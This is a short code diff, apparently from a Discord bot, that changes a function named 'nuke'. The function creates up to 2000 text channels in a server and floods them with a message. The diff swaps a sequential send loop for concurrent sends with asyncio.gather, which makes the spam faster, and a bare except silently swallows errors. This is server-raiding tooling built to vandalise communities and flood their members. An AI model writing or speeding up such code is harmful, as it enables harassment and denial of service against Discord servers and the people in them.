@@ -19,9 +19,7 @@ async def nuke(message):
         for i in range(2000):
             channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
             channelIds.append(channel.id)
-            for channelId in channelIds:
-                channel = client.get_channel(channelId)
-                await channel.send(MESSAGE)
+            await asyncio.gather(*(client.get_channel(channelId).send(MESSAGE) for channelId in channelIds))
     except:
         pass
 
